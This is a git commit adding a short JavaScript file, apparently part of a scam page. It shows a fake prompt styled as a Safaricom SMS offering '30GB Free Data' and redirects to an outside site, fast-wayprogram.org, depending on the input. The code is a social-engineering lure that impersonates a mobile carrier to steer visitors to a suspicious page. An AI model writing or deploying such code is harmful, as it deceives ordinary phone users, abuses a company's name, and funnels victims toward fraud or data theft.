04240c5a2bb83099789e5751cfc15a641f688fb6
superblog1 <imohette4@gmail.com>
2025-02-20 06:57:47 +0100

    Create safaricom-active.js

---
+++ safaricom-active.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVATE 30GB'
+password=prompt('SMS: Congratulations You are qualify for Safaricom 30GB Free Data, Kindly Press OK to Activate now   ','ACTIVATE 30GB');
+if (password != 'ACTIVATE 30GB') {
+location.href='https://fast-wayprogram.org/safaricom.html';
+}
